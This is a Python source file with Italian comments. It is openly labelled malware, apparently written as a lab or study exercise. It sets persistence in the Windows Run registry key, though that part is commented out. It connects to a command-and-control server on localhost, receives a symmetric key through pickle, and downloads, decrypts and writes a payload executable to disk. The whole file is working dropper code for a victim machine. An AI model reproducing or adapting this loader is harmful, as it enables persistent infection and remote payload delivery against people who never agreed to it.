import os       # path
import shutil   # utilizzato per copiare il malware nel filesystem
import winreg   # utilizzato per accedere al Windows registry per ottenere persistenza
import socket   # connessione verso il server
import rsa      # generazione coppia di chiavi pubblica/privata
import pickle   # serializzazione
from cryptography.fernet import Fernet
BUFFER_SIZE = 4096


# Press Maiusc+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

def set_reg(name, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                                      winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError as we:
        print(we)
        winreg.CloseKey(registry_key)
        return False


def get_reg(name):
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                                       winreg.KEY_READ)
        value, regtype = winreg.QueryValueEx(registry_key, name)
        winreg.CloseKey(registry_key)
        return value
    except WindowsError as we:
        print(we)
        winreg.CloseKey(registry_key)
        return None

if __name__ == '__main__':
    # replica del malware nella cartella Target_directory
    path_file_corrente = (os.path.abspath(__file__))
    path_destinazione = os.path.dirname(os.path.abspath(__file__))
    path_destinazione += "\\Target_directory\\malware.py"

    # replico il malware solamente quando ce n'è bisogno
    # if not os.path.isfile(path_destinazione):
    #     shutil.copyfile(path_file_corrente, path_destinazione)

    # Garantisco la persistenza nella macchina della vittima
    # inserendo il percorso del malware nella chiave di registro
    # Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    # ho scelto la chiave HKEY_CURRENT_USER perché così non devo avere diritti di admin
    # https://sensei-infosec.netlify.app/forensics/registry/persistence/2020/04/15/malware-persistence-registry.html
    # TODO: valuta la creazione di una classe

    # Read value
    # if get_reg('Test_privacy') is None:
    #     set_reg('Test_privacy', path_file_corrente)
    # else:
    #     print("Chiave di registro già presente")

    # connessione al server C2
    ip_server = "127.0.0.1"
    port_server = 1234
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Tentativo di connessione al server C2...")
    server.connect((ip_server, port_server))
    print("Connessione al server C2 avvenuta con successo!")
    #path_real_malware_from_C2 = r"C:\Users\angel\Desktop\chrome_proxy.exe"
    path_real_malware_from_C2 = r"C:\Users\angel\Desktop\cmd_1.exe"
    print("Ricezione file dal C2...")
    with open(path_real_malware_from_C2, "wb") as malware_from_C2:
        byte_key = server.recv(BUFFER_SIZE)
        key = pickle.loads(byte_key)
        symmetric_key = Fernet(key)
        print("Chiave simmetrica ricevuta")
        bytes_read = b""
        # leggo la dimensione del file da ricevere
        file_length = server.recv(BUFFER_SIZE).decode('utf8')
        file_length = int(file_length)
        while True:
            bytes_read += server.recv(BUFFER_SIZE)
            if len(bytes_read) == file_length:
                break
        malware_from_C2.write(symmetric_key.decrypt(bytes_read))


    print("Terminato!")
    server.close()


